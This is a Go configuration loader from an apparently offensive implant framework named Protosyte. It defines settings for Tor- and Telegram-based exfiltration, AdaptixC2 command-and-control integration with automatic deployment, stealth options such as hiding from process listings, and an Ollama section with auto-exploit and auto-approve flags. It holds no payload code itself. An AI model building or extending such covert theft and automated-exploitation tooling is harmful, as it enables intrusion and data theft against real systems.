// Mission Configuration Loader
// Provides unified mission.yaml parsing and access across all Protosyte components

package mission

import (
	"fmt"
	"os"
	"path/filepath"

	"gopkg.in/yaml.v3"
)

// MissionConfig represents the complete mission configuration
type MissionConfig struct {
	Mission      MissionSection      `yaml:"mission"`
	Target       TargetSection       `yaml:"target"`
	Exfiltration ExfiltrationSection `yaml:"exfiltration"`
	Analysis     AnalysisSection     `yaml:"analysis"`
	AdaptixC2    *AdaptixC2Section  `yaml:"adaptixc2,omitempty"`
	Stealth      StealthSection     `yaml:"stealth,omitempty"`
	AI           *AISection         `yaml:"ai,omitempty"`
}

// MissionSection contains mission metadata
type MissionSection struct {
	ID   string `yaml:"id"`
	Name string `yaml:"name"`
}

// TargetSection contains target configuration
type TargetSection struct {
	IP       string   `yaml:"ip,omitempty"`
	Hostname string   `yaml:"hostname,omitempty"`
	OS       string   `yaml:"os,omitempty"`
	Hooks    []string `yaml:"hooks,omitempty"`
	Filters  []Filter `yaml:"filters,omitempty"`
}

// Filter defines a data pattern filter
type Filter struct {
	Pattern string `yaml:"pattern"`
	Type    string `yaml:"type"`
}

// ExfiltrationSection contains exfiltration parameters
type ExfiltrationSection struct {
	IntervalSeconds int    `yaml:"interval_seconds"`
	JitterPercent   int    `yaml:"jitter_percent"`
	TorProxy        string `yaml:"tor_proxy"`
	TelegramToken   string `yaml:"telegram_token,omitempty"` // Usually from env
	ChatID          string `yaml:"chat_id,omitempty"`
}

// AnalysisSection contains analysis rig parameters
type AnalysisSection struct {
	VMIP          string `yaml:"vm_ip,omitempty"`
	DashboardPort int    `yaml:"dashboard_port,omitempty"`
}

// AdaptixC2Section contains AdaptixC2 integration settings
type AdaptixC2Section struct {
	Enabled          bool                `yaml:"enabled"`
	Server           string              `yaml:"server,omitempty"`
	APIKey           string              `yaml:"api_key,omitempty"` // Usually from env
	AutoDeployProtosyte bool             `yaml:"auto_deploy_protosyte,omitempty"`
	ActivePhase      *PhaseConfig        `yaml:"active_phase,omitempty"`
	PassivePhase     *PhaseConfig        `yaml:"passive_phase,omitempty"`
}

// PhaseConfig defines active/passive phase configuration
type PhaseConfig struct {
	Enabled    bool     `yaml:"enabled"`
	Duration   int      `yaml:"duration,omitempty"` // seconds
	StartAfter int      `yaml:"start_after,omitempty"` // seconds
	Operations []string `yaml:"operations,omitempty"`
	CollectionOnly bool `yaml:"collection_only,omitempty"`
}

// StealthSection contains stealth configuration
type StealthSection struct {
	MemoryOnly    bool `yaml:"memory_only,omitempty"`
	HideFromProc  bool `yaml:"hide_from_proc,omitempty"`
	UseTor        bool `yaml:"use_tor,omitempty"`
	TimingJitter  bool `yaml:"timing_jitter,omitempty"`
}

// AISection contains Ollama AI integration settings
type AISection struct {
	Enabled          bool   `yaml:"enabled"`
	OllamaHost       string `yaml:"ollama_host,omitempty"`
	OllamaModel      string `yaml:"ollama_model,omitempty"`
	AutoExploit      bool   `yaml:"auto_exploit,omitempty"`
	CVEResearch      bool   `yaml:"cve_research,omitempty"`
	GitHubAutoApprove bool  `yaml:"github_auto_approve,omitempty"`
}

var globalConfig *MissionConfig

// LoadMissionConfig loads mission.yaml from the specified path or default location
func LoadMissionConfig(path string) (*MissionConfig, error) {
	// If path is empty, try default locations
	if path == "" {
		// Try current directory
		if _, err := os.Stat("mission.yaml"); err == nil {
			path = "mission.yaml"
		} else if _, err := os.Stat("../mission.yaml"); err == nil {
			path = "../mission.yaml"
		} else {
			return nil, fmt.Errorf("mission.yaml not found in current or parent directory")
		}
	}

	// Resolve absolute path
	absPath, err := filepath.Abs(path)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve path: %w", err)
	}

	// Read file
	data, err := os.ReadFile(absPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read mission.yaml: %w", err)
	}

	// Parse YAML
	var config MissionConfig
	if err := yaml.Unmarshal(data, &config); err != nil {
		return nil, fmt.Errorf("failed to parse mission.yaml: %w", err)
	}

	// Override sensitive values from environment variables
	if token := os.Getenv("PROTOSYTE_BOT_TOKEN"); token != "" {
		config.Exfiltration.TelegramToken = token
	}

	if apiKey := os.Getenv("ADAPTIXC2_API_KEY"); apiKey != "" && config.AdaptixC2 != nil {
		config.AdaptixC2.APIKey = apiKey
	}

	if serverURL := os.Getenv("ADAPTIXC2_SERVER_URL"); serverURL != "" && config.AdaptixC2 != nil {
		config.AdaptixC2.Server = serverURL
	}

	// Override AI settings from environment
	if ollamaHost := os.Getenv("OLLAMA_HOST"); ollamaHost != "" && config.AI != nil {
		config.AI.OllamaHost = ollamaHost
	}

	if ollamaModel := os.Getenv("OLLAMA_MODEL"); ollamaModel != "" && config.AI != nil {
		config.AI.OllamaModel = ollamaModel
	}

	// Store globally
	globalConfig = &config

	return &config, nil
}

// GetMissionConfig returns the globally loaded mission configuration
func GetMissionConfig() *MissionConfig {
	return globalConfig
}

// GetMissionID returns the mission ID as uint64
func (m *MissionConfig) GetMissionID() uint64 {
	// Parse hex string to uint64
	var id uint64
	fmt.Sscanf(m.Mission.ID, "0x%x", &id)
	return id
}

// GetMissionIDString returns the mission ID as string
func (m *MissionConfig) GetMissionIDString() string {
	return m.Mission.ID
}

// IsAdaptixC2Enabled returns true if AdaptixC2 integration is enabled
func (m *MissionConfig) IsAdaptixC2Enabled() bool {
	return m.AdaptixC2 != nil && m.AdaptixC2.Enabled
}

// IsAIEnabled returns true if AI integration is enabled
func (m *MissionConfig) IsAIEnabled() bool {
	return m.AI != nil && m.AI.Enabled
}

// GetDashboardAddr returns the dashboard address
func (m *MissionConfig) GetDashboardAddr() string {
	if m.Analysis.DashboardPort == 0 {
		return "localhost:8080"
	}
	if m.Analysis.VMIP != "" {
		return fmt.Sprintf("%s:%d", m.Analysis.VMIP, m.Analysis.DashboardPort)
	}
	return fmt.Sprintf("localhost:%d", m.Analysis.DashboardPort)
}

